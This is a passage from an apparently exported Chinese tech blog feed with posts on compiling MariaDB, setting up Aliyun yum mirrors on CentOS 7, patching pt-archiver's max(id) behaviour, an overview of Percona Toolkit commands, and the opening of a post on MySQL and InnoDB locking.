<li><code>CMAKE_BUILD_TYPE=[DEBUG|RELEASE|MINSIZEREL|RELWITHDEBINFO]</code>
<ul>
<li>debug, 充满了调试信息的版本，没优化，coding的时候测试用</li>
<li>release，一点调试信息都没有的版本，最终发布用。</li>
<li>relwithdebinfo，优化过带有调试信息的版本，我在内测的时候用，甚至对最终发布也会用。它会有调试信息，所以只要有debugger，出了问题好查。</li>
</ul>
</li>
</ul>
<h3 id="AWS">AWS</h3>
<p>The plugin uses AWS C++ SDK</p>
<p><code>-DPLUGIN_AWS_KEY_MANAGEMENT=DYNAMIC -DAWS_SDK_EXTERNAL_PROJECT=1</code></p>
<h3 id="lz4">lz4</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- checking for module &#x27;liblz4&#x27;</span><br><span class="line">--   package &#x27;liblz4&#x27; not found</span><br></pre></td></tr></table></figure></div>
<p>In CentOS, <code>sudo yum install -y liblzf-devel</code></p>
<h3 id="policy">policy</h3>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Scanning dependencies of target mariadb-pp</span><br><span class="line">[ 13%] Generating mariadb.pp</span><br><span class="line">/usr/bin/checkmodule:  loading policy configuration from /root/mariadb/mariadb-10.2.14/support-files/policy/selinux/mariadb.te</span><br><span class="line">/usr/bin/checkmodule:  policy configuration loaded</span><br><span class="line">/usr/bin/checkmodule:  writing binary representation (version 17) to /root/mariadb/mariadb-10.2.14/support-files/CMakeFiles/mariadb-pp.dir/mariadb.mod</span><br><span class="line">/bin/sh: /usr/bin/semodule_package: No such file or directory</span><br><span class="line">make[2]: *** [support-files/mariadb.pp] Error 127</span><br><span class="line">make[1]: *** [support-files/CMakeFiles/mariadb-pp.dir/all] Error 2</span><br><span class="line">make[1]: *** Waiting <span class="keyword">for</span> unfinished <span class="built_in">jobs</span>....</span><br></pre></td></tr></table></figure></div>
<p>Solution:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install -y checkpolicy</span><br><span class="line">sudo yum install -y policycoreutils</span><br><span class="line">sudo yum install -y policycoreutils-python</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://mariadb.com/kb/en/library/compiling-mariadb-for-debugging/" >https://mariadb.com/kb/en/library/compiling-mariadb-for-debugging/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/kb/en/library/source-building-mariadb-on-centos/" >https://mariadb.com/kb/en/library/source-building-mariadb-on-centos/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/kb/en/library/benchmark-builds/" >https://mariadb.com/kb/en/library/benchmark-builds/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://www.linuxfromscratch.org/blfs/view/7.7/server/mariadb.html" >http://www.linuxfromscratch.org/blfs/view/7.7/server/mariadb.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/kb/en/library/installating-galera-from-source/" >https://mariadb.com/kb/en/library/installating-galera-from-source/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="Footnotes">Footnotes</h2>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://mariadb.com/resources/blog/compiling-debugging-mariadband-mysql-eclipse-scratch-part-1-setup-building-environment" >https://mariadb.com/resources/blog/compiling-debugging-mariadband-mysql-eclipse-scratch-part-1-setup-building-environment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a href="https://shawnyan.cn/2018/mysql/how-to-install-mysql-on-centos">https://shawnyan.cn/2018/mysql/how-to-install-mysql-on-centos</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>MariaDB</category>
        <category>compiling</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>compiling</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS 7 YUM配置</title>
    <url>/2018/centos/centos-7-yum-repo/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/img/centos/centos-logo.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="实验环境信息">实验环境信息</h2>
<blockquote>
<p>CentOS Linux release 7.4.1708 (Core)</p>
</blockquote>
<p>下面是yum仓库阿里云代理的配置方式。</p>
<h2 id="Mirror">Mirror</h2>
<ul>
<li>aliyun-centos</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt;&gt; centos-aliyun.repo &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">[centos-aliyun]</span></span><br><span class="line"><span class="string">name=centos-aliyun</span></span><br><span class="line"><span class="string">baseurl=https://mirrors.aliyun.com/centos/7.4.1708/os/x86_64/</span></span><br><span class="line"><span class="string">enable=1</span></span><br><span class="line"><span class="string">gpgcheck=0</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>aliyun-epel</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt;&gt; epel-aliyun.repo &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">[epel-aliyun]</span></span><br><span class="line"><span class="string">name=epel-aliyun</span></span><br><span class="line"><span class="string">baseurl=https://mirrors.aliyun.com/epel/7/x86_64/</span></span><br><span class="line"><span class="string">enable=1</span></span><br><span class="line"><span class="string">gpgcheck=0</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>aliyun-docker-ce</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt;&gt; docker-ce-aliyun.repo &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">[docker-ce-aliyun]</span></span><br><span class="line"><span class="string">name=docker-ce-aliyun</span></span><br><span class="line"><span class="string">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/7/x86_64/stable/</span></span><br><span class="line"><span class="string">enable=1</span></span><br><span class="line"><span class="string">gpgcheck=0</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://mirrors.aliyun.com/" >https://mirrors.aliyun.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Red Hat</category>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>redhat</tag>
        <tag>centos</tag>
        <tag>CentOS 7</tag>
        <tag>yum</tag>
      </tags>
  </entry>
  <entry>
    <title>在 VMware 上安装 CentOS 7.4</title>
    <url>/2018/centos/centos-7-in-vmware/</url>
    <content><![CDATA[<p>搭建一个虚拟机实验环境</p>
<h2 id="实验环境信息">实验环境信息</h2>
<blockquote>
<p>CentOS Linux release 7.4.1708 (Core)</p>
</blockquote>
<h2 id="配置项">配置项</h2>
<ul>
<li>[ ] hostname</li>
<li>[ ] time</li>
<li>[ ] yum repo</li>
</ul>
<h2 id="Base-tools">Base tools</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sys init</span></span><br><span class="line">sudo yum repolist all</span><br><span class="line"><span class="comment">#sudo yum check-update</span></span><br><span class="line"><span class="comment">#sudo yum update</span></span><br><span class="line">sudo yum install -y sysstat</span><br><span class="line">sudo yum install -y iftop</span><br><span class="line">sudo yum install -y yum-utils</span><br><span class="line">sudo yum install -y lrzsz</span><br><span class="line">sudo yum install -y libpwquality</span><br><span class="line">sudo yum install -y perf</span><br><span class="line">sudo yum install -y lsof</span><br><span class="line">sudo yum install -y bind-utils</span><br><span class="line">sudo yum install -y dstat</span><br><span class="line"></span><br><span class="line"><span class="comment"># sysstat</span></span><br><span class="line"><span class="comment"># http://sebastien.godard.pagesperso-orange.fr/download.html</span></span><br><span class="line"></span><br><span class="line">sudo yum install -y unzip</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://github.com/shawn0915/mysql-study/blob/master/scripts/os_status/" >https://github.com/shawn0915/mysql-study/blob/master/scripts/os_status/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Red Hat</category>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>redhat</tag>
        <tag>centos</tag>
        <tag>kernel</tag>
        <tag>CentOS 7</tag>
        <tag>upgrade</tag>
      </tags>
  </entry>
  <entry>
    <title>pt-archiver不会迁移max(id)那条数据的问题</title>
    <url>/2018/mysql/pt-archiver-maxid/</url>
    <content><![CDATA[<blockquote>
<p>To be is to be perceived.</p>
</blockquote>
<ul>
<li>现象描述</li>
</ul>
<p><code>pt-archiver</code>迁移数据时，发现原表中总会留有一条数据，即max(id)那条数据，修正方案如下。</p>
<p><code>pt-archiver</code>源码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( $o-&gt;get(&#x27;safe-auto-increment&#x27;)</span><br><span class="line">      &amp;&amp; $sel_stmt-&gt;&#123;index&#125;</span><br><span class="line">      &amp;&amp; scalar(@&#123;$src-&gt;&#123;info&#125;-&gt;&#123;keys&#125;-&gt;&#123;$sel_stmt-&gt;&#123;index&#125;&#125;-&gt;&#123;cols&#125;&#125;) == 1</span><br><span class="line">      &amp;&amp; $src-&gt;&#123;info&#125;-&gt;&#123;is_autoinc&#125;-&gt;&#123;</span><br><span class="line">         $src-&gt;&#123;info&#125;-&gt;&#123;keys&#125;-&gt;&#123;$sel_stmt-&gt;&#123;index&#125;&#125;-&gt;&#123;cols&#125;-&gt;[0]</span><br><span class="line">      &#125;</span><br><span class="line">) &#123;</span><br><span class="line">   my $col = $q-&gt;quote($sel_stmt-&gt;&#123;scols&#125;-&gt;[0]);</span><br><span class="line">   my ($val) = $dbh-&gt;selectrow_array(&quot;SELECT MAX($col) FROM $src-&gt;&#123;db_tbl&#125;&quot;);</span><br><span class="line">   $first_sql .= &quot; AND ($col &lt; &quot; . $q-&gt;quote_val($val) . &quot;)&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>第 6348 行改为小于等于</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">6339    if ( $o-&gt;get(&#x27;safe-auto-increment&#x27;)</span><br><span class="line">6340          &amp;&amp; $sel_stmt-&gt;&#123;index&#125;</span><br><span class="line">6341          &amp;&amp; scalar(@&#123;$src-&gt;&#123;info&#125;-&gt;&#123;keys&#125;-&gt;&#123;$sel_stmt-&gt;&#123;index&#125;&#125;-&gt;&#123;cols&#125;&#125;) == 1</span><br><span class="line">6342          &amp;&amp; $src-&gt;&#123;info&#125;-&gt;&#123;is_autoinc&#125;-&gt;&#123;</span><br><span class="line">6343             $src-&gt;&#123;info&#125;-&gt;&#123;keys&#125;-&gt;&#123;$sel_stmt-&gt;&#123;index&#125;&#125;-&gt;&#123;cols&#125;-&gt;[0]</span><br><span class="line">6344          &#125;</span><br><span class="line">6345    ) &#123;</span><br><span class="line">6346       my $col = $q-&gt;quote($sel_stmt-&gt;&#123;scols&#125;-&gt;[0]);</span><br><span class="line">6347       my ($val) = $dbh-&gt;selectrow_array(&quot;SELECT MAX($col) FROM $src-&gt;&#123;db_tbl&#125;&quot;);</span><br><span class="line">6348       $first_sql .= &quot; AND ($col &lt;= &quot; . $q-&gt;quote_val($val) . &quot;)&quot;;</span><br><span class="line">6349    &#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://github.com/percona/percona-toolkit/blob/3.0.6/bin/pt-archiver#L6348" >https://github.com/percona/percona-toolkit/blob/3.0.6/bin/pt-archiver#L6348 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://www.ttlsa.com/mysql/pt-archiver-bug-cannot-migration-max-id-record/" >http://www.ttlsa.com/mysql/pt-archiver-bug-cannot-migration-max-id-record/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/shawn0915/shawnoffice-toolkit/blob/master/percona-toolkit/bin/pt-archiver#L6348" >https://github.com/shawn0915/shawnoffice-toolkit/blob/master/percona-toolkit/bin/pt-archiver#L6348 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Percona</category>
        <category>kit</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>mysql</tag>
        <tag>percona</tag>
        <tag>pt-archiver</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 Percona Toolkit</title>
    <url>/2018/mysql/pt-percona-toolkit-intro/</url>
    <content><![CDATA[<p>About Percona Toolkit</p>
<blockquote>
<p>“Percona Toolkit allows our large, transaction-based customers to make regular schema changes as their business evolves without interrupting their 24X7 operations.” – Hany Fahim,co-Founder and CEO of VM Farms</p>
</blockquote>
<blockquote>
<p>Percona Toolkit is a collection of advanced open source command-line tools, developed and used by the Percona technical staff, that are engineered to perform a variety of MySQL, MariaDB, MongoDB, and PostgreSQL server and system tasks that are too difficult or complex to perform manually.</p>
</blockquote>
<p><a class="link"   href="https://www.percona.com/software/database-tools/percona-toolkit" >https://www.percona.com/software/database-tools/percona-toolkit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/img/mysql/percona-toolkit-2.2.19.png"
                      alt="" loading="lazy"
                ></p>
<p>Percona Toolkit is a collection of advanced command-line tools used by Percona) support staff to perform a variety of MySQL, MongoDB, and system tasks that are too difficult or complex to perform manually.</p>
<h2 id="Version">Version</h2>
<blockquote>
<p>Percona Toolkit 3.0.6</p>
</blockquote>
<h3 id="Dependence-Package">Dependence Package</h3>
<p>安装依赖</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install -y perl-Time-HiRes.x86_64</span><br><span class="line">sudo yum install -y perl-DBI.x86_64</span><br><span class="line">sudo yum install -y perl-DBD-MySQL.x86_64</span><br><span class="line">sudo yum install -y perl-IO-Socket-IP</span><br><span class="line">sudo yum install -y perl-IO-Socket-SSL</span><br><span class="line">sudo yum install -y perl-Net-LibIDN</span><br><span class="line">sudo yum install -y perl-Net-SSLeay</span><br><span class="line">sudo yum install -y gdb</span><br><span class="line">sudo yum install -y strace</span><br><span class="line">sudo yum install -y perl-ExtUtils-CBuilder</span><br><span class="line">sudo yum install -y perl-ExtUtils-MakeMaker</span><br><span class="line">sudo yum install -y perl-CPAN</span><br><span class="line">sudo yum install -y perl-Digest-MD5</span><br></pre></td></tr></table></figure></div>
<h2 id="DSN">DSN</h2>
<p>DATA SOURCE NAME</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">h=127.0.0.1,P=3306,u=root,D=test,t=author</span><br></pre></td></tr></table></figure></div>
<h2 id="List">List</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pt-align</span><br><span class="line">pt-archiver</span><br><span class="line">pt-config-diff</span><br><span class="line">pt-deadlock-logger</span><br><span class="line">pt-diskstats</span><br><span class="line">pt-duplicate-key-checker</span><br><span class="line">pt-fifo-split</span><br><span class="line">pt-find</span><br><span class="line">pt-fingerprint</span><br><span class="line">pt-fk-error-logger</span><br><span class="line">pt-heartbeat</span><br><span class="line">pt-index-usage</span><br><span class="line">pt-ioprofile</span><br><span class="line">pt-kill</span><br><span class="line">pt-mext</span><br><span class="line">pt-mysql-summary</span><br><span class="line">pt-online-schema-change</span><br><span class="line">pt-pmp</span><br><span class="line">pt-query-digest</span><br><span class="line">pt-show-grants</span><br><span class="line">pt-sift</span><br><span class="line">pt-slave-delay</span><br><span class="line">pt-slave-find</span><br><span class="line">pt-slave-restart</span><br><span class="line">pt-stalk</span><br><span class="line">pt-summary</span><br><span class="line">pt-table-checksum</span><br><span class="line">pt-table-sync</span><br><span class="line">pt-table-usage</span><br><span class="line">pt-upgrade</span><br><span class="line">pt-variable-advisor</span><br><span class="line">pt-visual-explain</span><br></pre></td></tr></table></figure></div>
<h2 id="Classify-34">Classify(34)</h2>
<p>当前版本，该工具集共由34个工具组成，按状态、分析、监控、备份、在线变更、主从、实用小工具和MongoDB等功能分类，并做如下简单说明。</p>
<h3 id="Status-5">Status(5)</h3>
<p>状态</p>
<ul>
<li>pt-summary</li>
</ul>
<p>系统状态</p>
<ul>
<li>pt-diskstats</li>
</ul>
<p>实时获取磁盘IO</p>
<ul>
<li>pt-mysql-summary</li>
</ul>
<p>获取mysql状态</p>
<ul>
<li>pt-show-grants</li>
</ul>
<p>查看mysql用户权限信息</p>
<ul>
<li>pt-mext</li>
</ul>
<p><code>mysqladmin ext</code>/<code>show global status;</code><br>
获取全局状态信息，<br>
查看一组变量的当前值、上一次查询的值，以及它们之间的差值</p>
<h3 id="Analyze-9">Analyze(9)</h3>
<p>分析</p>
<ul>
<li>pt-query-digest</li>
</ul>
<p>分析慢查询/抓取tcp package，然后进行分析</p>
<ul>
<li>pt-stalk</li>
</ul>
<p>达到触发条件后，开始收集问题数据</p>
<ul>
<li>pt-sift</li>
</ul>
<p>分析<code>pt-stalk</code>产生的数据</p>
<ul>
<li>pt-index-usage</li>
</ul>
<p>依据<code>slow log</code>分析index使用情况，对log中的每条查询进行EXPLAIN操作，然后打印出关于索引和查询的报告</p>
<ul>
<li>
<p>pt-table-usage</p>
</li>
<li>
<p>pt-pmp</p>
</li>
</ul>
<p>分析获取堆栈信息。慎用，有概率会hung住mysqld。</p>
<ul>
<li>pt-duplicate-key-checker</li>
</ul>
<p>检查重复Index</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pt-duplicate-key-checker --host localhost</span><br></pre></td></tr></table></figure></div>
<ul>
<li>pt-upgrade</li>
</ul>
<p>验证比较两个host的结果集一致性，检查新版本中运行的SQL是否与老版本一样，返回相同的结果。</p>
<ul>
<li>pt-variable-advisor</li>
</ul>
<p>分析变量配置的合理性</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pt-variable-advisor --host localhost</span><br></pre></td></tr></table></figure></div>
<h3 id="Monitor-4">Monitor(4)</h3>
<ul>
<li>pt-deadlock-logger</li>
</ul>
<p>监控死锁信息</p>
<ul>
<li>pt-fk-error-logger</li>
</ul>
<p>监控外键错误信息</p>
<ul>
<li>pt-heartbeat</li>
</ul>
<p>监控MySQL复制延迟</p>
<ul>
<li>pt-ioprofile</li>
</ul>
<p>跟踪监控IO状态。默认时间30s。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./pt-ioprofile --cell=sizes --run-time=10</span><br></pre></td></tr></table></figure></div>
<h3 id="Backup-1">Backup(1)</h3>
<p>备份</p>
<ul>
<li>pt-archiver</li>
</ul>
<p>归档数据</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pt-archiver --<span class="built_in">source</span> h=127.0.0.1,P=3306,u=root,D=<span class="built_in">test</span>,t=author \</span><br><span class="line">  --file <span class="string">&#x27;/data/log/archive/%Y-%m-%d-%H-%i-%s-%D-%t.txt&#x27;</span> \</span><br><span class="line">  --<span class="built_in">where</span> <span class="string">&quot;1=1&quot;</span></span><br><span class="line"></span><br><span class="line">pt-archiver --<span class="built_in">source</span> h=127.0.0.1,P=3306,u=root,D=<span class="built_in">test</span>,t=author \</span><br><span class="line">  --dest h=127.0.0.1,P=3306,u=root,D=<span class="built_in">test</span>,t=author_copy \</span><br><span class="line">  --file <span class="string">&#x27;/data/log/archive/%Y-%m-%d-%H-%i-%s-%D-%t.txt&#x27;</span> \</span><br><span class="line">  --<span class="built_in">where</span> <span class="string">&quot;1=1&quot;</span> --<span class="built_in">limit</span> 1000 --progress 2 --commit-each \</span><br><span class="line">  --no-delete --statistics</span><br></pre></td></tr></table></figure></div>
<h3 id="Online-Change-1">Online Change(1)</h3>
<ul>
<li>pt-online-schema-change</li>
</ul>
<p>ALTER tables without locking them.</p>
<h3 id="Master-Slave-5">Master Slave(5)</h3>
<ul>
<li>pt-table-checksum</li>
</ul>
<p>检查主从一致性。修复可使用<code>pt-table-sync</code></p>
<ul>
<li>
<p>pt-table-sync</p>
</li>
<li>
<p>pt-slave-delay</p>
</li>
<li>
<p>pt-slave-find</p>
</li>
<li>
<p>pt-slave-restart</p>
</li>
</ul>
<h3 id="Utils-7">Utils(7)</h3>
<ul>
<li>pt-align</li>
</ul>
<p>按列格式化并输出</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">mysql@centos7:~$ <span class="built_in">cat</span> demo-align.txt </span><br><span class="line">a1  a2  a3</span><br><span class="line">1 2 3</span><br><span class="line">1 2  3</span><br><span class="line">1  2  3</span><br><span class="line">mysql@centos7:~$ pt-align demo-align.txt </span><br><span class="line">a1 a2 a3</span><br><span class="line"> 1  2  3</span><br><span class="line"> 1  2  3</span><br><span class="line"> 1  2  3</span><br></pre></td></tr></table></figure></div>
<ul>
<li>pt-visual-explain</li>
</ul>
<p>将<code>explain</code>的结果集转换为树结构</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">mysql@centos7:~$ mysql -uroot -e <span class="string">&quot;explain select * from mysql.user&quot;</span> | pt-visual-explain </span><br><span class="line">Table scan</span><br><span class="line">rows           23</span><br><span class="line">+- Table</span><br><span class="line">   table          user</span><br><span class="line">mysql@centos7:~$ mysql -uroot -e <span class="string">&quot;explain select * from mysql.user&quot;</span>                     </span><br><span class="line">+------+-------------+-------+------+---------------+------+---------+------+------+-------+</span><br><span class="line">| <span class="built_in">id</span>   | select_type | table | <span class="built_in">type</span> | possible_keys | key  | key_len | ref  | rows | Extra |</span><br><span class="line">+------+-------------+-------+------+---------------+------+---------+------+------+-------+</span><br><span class="line">|    1 | SIMPLE      | user  | ALL  | NULL          | NULL | NULL    | NULL |   23 |       |</span><br><span class="line">+------+-------------+-------+------+---------------+------+---------+------+------+-------+</span><br><span class="line">mysql@centos7:~$ </span><br></pre></td></tr></table></figure></div>
<ul>
<li>pt-config-diff</li>
</ul>
<p>比较两个配置文件的差异</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">mysql@centos7:~$ pt-config-diff /etc/my.cnf my02.cnf </span><br><span class="line">5 config differences</span><br><span class="line">Variable                  /etc/my.cnf               my02.cnf</span><br><span class="line">========================= ========================= =========================</span><br><span class="line">gmcast.listen_addr        tcp://192.168.146.151:... tcp://192.168.146.152:...</span><br><span class="line">gtid_domain_id            2                         3</span><br><span class="line">server_id                 1                         2</span><br><span class="line">wsrep_node_address        192.168.146.151           192.168.146.152</span><br><span class="line">wsrep_node_name           centos7                   vm-db02</span><br><span class="line">mysql@centos7:~$ </span><br></pre></td></tr></table></figure></div>
<ul>
<li>pt-kill</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">mysql@centos7:~$ pt-kill --no-version-check --<span class="built_in">print</span> --busy-time 60</span><br><span class="line"><span class="comment"># 2018-02-14T17:45:36 KILL 169 (Query 225 sec) select sleep(100000)</span></span><br><span class="line">^C</span><br><span class="line">mysql@centos7:~$ pt-kill --no-version-check --<span class="built_in">print</span> --busy-time 60 --<span class="built_in">kill</span></span><br><span class="line"><span class="comment"># 2018-02-14T17:45:43 KILL 169 (Query 232 sec) select sleep(100000)</span></span><br><span class="line">^C</span><br></pre></td></tr></table></figure></div>
<ul>
<li>pt-find</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pt-find --<span class="built_in">printf</span> <span class="string">&quot;%T\t%D.%N\n&quot;</span> | <span class="built_in">sort</span> -rn</span><br></pre></td></tr></table></figure></div>
<ul>
<li>pt-fifo-split</li>
</ul>
<p>分隔大文件</p>
<ul>
<li>pt-fingerprint</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">mysql@centos7:~$ pt-fingerprint --query <span class="string">&quot;select id from tbl_test where id = fbc5e685a5d3d45aa1d0347fdb7c4d35&quot;</span> --match-md5-checksums</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">id</span> from tbl_test <span class="built_in">where</span> <span class="built_in">id</span> = fbc?</span><br><span class="line">mysql@centos7:~$</span><br></pre></td></tr></table></figure></div>
<h3 id="MongoDB-2">MongoDB(2)</h3>
<ul>
<li>pt-mongodb-query-digest</li>
<li>pt-mongodb-summary</li>
</ul>
<h2 id="Mark">Mark</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[root@centos7 bin]<span class="comment"># ./pt-diskstats </span></span><br><span class="line">Can<span class="string">&#x27;t locate Digest/MD5.pm in @INC (@INC contains: /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at ./pt-diskstats line 1221.</span></span><br><span class="line"><span class="string">BEGIN failed--compilation aborted at ./pt-diskstats line 1221.</span></span><br></pre></td></tr></table></figure></div>
<p>Resolve: <code>yum install perl-Digest-MD5</code></p>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://www.percona.com/downloads/percona-toolkit/LATEST/" >https://www.percona.com/downloads/percona-toolkit/LATEST/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.percona.com/doc/percona-toolkit/LATEST/index.html" >https://www.percona.com/doc/percona-toolkit/LATEST/index.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.percona.com/hubfs/Manuals/Percona_Toolkit/Percona-Toolkit.-3.0.6.pdf?t=1516049974537" >https://learn.percona.com/hubfs/Manuals/Percona_Toolkit/Percona-Toolkit.-3.0.6.pdf?t=1516049974537 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://dev.mysql.com/doc/refman/5.7/en/innodb-create-index-overview.html" >https://dev.mysql.com/doc/refman/5.7/en/innodb-create-index-overview.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/shawn0915/shawnoffice-toolkit/" >https://github.com/shawn0915/shawnoffice-toolkit/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Percona</category>
        <category>kit</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>mysql</tag>
        <tag>percona</tag>
        <tag>toolkit</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 MySQL 的锁和 InnoDB Locking</title>
    <url>/2018/mysql/mysql-lock/</url>
    <content><![CDATA[<p>About lock in MySQL and InnoDB locking</p>
<blockquote>
<p>I reside in the present.</p>
</blockquote>
<h2 id="实验环境">实验环境</h2>
<blockquote>
<p>MySQL 5.7.21 on docker<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
</blockquote>
<h2 id="主要内容">主要内容</h2>
<ul>
<li>MySQL Lock</li>
<li>InnoDB Lock</li>
<li>Deadlock</li>
</ul>
<h2 id="MySQL中四种类型的锁">MySQL中四种类型的锁</h2>
<ul>
<li>Table, 表锁</li>
<li>Row, 行锁</li>
<li>Page, 页锁</li>
<li>Matedata, 元数据锁</li>
</ul>
<blockquote>
<p>其中，page lock only in BDB storage engine.</p>
</blockquote>
<blockquote>
<p>其他，galera cluster lock</p>
</blockquote>
<h3 id="Metadata-Lock">Metadata Lock</h3>
<ul>
<li>检查锁状态</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uroot -e <span class="string">&quot;show processlist\G&quot;</span> | <span class="built_in">tee</span> processlist.log</span><br><span class="line">mysql -uroot -e <span class="string">&quot;show engine innodb status\G&quot;</span> | <span class="built_in">tee</span> innodb-status.log</span><br></pre></td></tr></table></figure></div>
<ul>
<li>关键参数</li>
</ul>
<p>锁超时， <code>lock_wait_timeout</code>，默认值 31536000s(1year)</p>
<h2 id="InnoDB-Lock">InnoDB Lock</h2>
<ul>
<li>
<p>两个特点</p>
<ul>
<li>支持事务</li>
<li>行级锁</li>
</ul>
</li>
<li>
<p>四个问题</p>
<ul>
<li>更新丢失, Lost Update</li>
<li>脏读, Dirty Reads</li>
<li>不可重复读, Non-Repeatable Reads</li>
<li>幻读, Phantom Reads</li>
</ul>
